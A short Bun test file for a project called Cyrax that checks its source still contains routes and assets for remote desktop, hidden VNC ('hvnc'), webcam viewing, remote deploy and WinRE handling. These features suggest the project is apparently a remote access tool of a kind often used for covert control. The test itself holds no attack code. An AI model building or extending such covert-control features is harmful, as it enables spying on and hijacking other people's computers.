import { describe, expect, test } from "bun:test";
import { readFile } from "node:fs/promises";
import { join } from "node:path";

const root = join(import.meta.dir, "..");
const read = (path: string) => readFile(join(root, path), "utf8");

describe("Cyrax feature preservation", () => {
  test("server registers custom command routes", async () => {
    const source = await read("src/main-server.ts");
    for (const handler of ["handleWallpaperRoutes", "handleDeployRoutes", "handleWinRERoutes"]) {
      expect(source).toContain(handler);
    }
  });

  test("custom viewer and media pages remain routed", async () => {
    const routes = await read("src/server/routes/page-routes.ts");
    for (const page of ["viewer.html", "webcams.html", "soundboard.html"]) {
      expect(routes).toContain(page);
    }
  });

  test("custom browser assets remain available", async () => {
    for (const asset of ["side-panel.js", "viewer.js", "webcams.js", "sounds.js"]) {
      expect((await read(`public/assets/${asset}`)).length).toBeGreaterThan(100);
    }
  });

  test("upstream privacy and virtual controls remain present", async () => {
    const remoteDesktop = `${await read("public/remotedesktop.html")}\n${await read("public/assets/remotedesktop.js")}`;
    const hvnc = await read("public/assets/hvnc.js");
    expect(remoteDesktop.toLowerCase()).toContain("privacy");
    expect(hvnc.toLowerCase()).toContain("virtual_mode");
  });
});
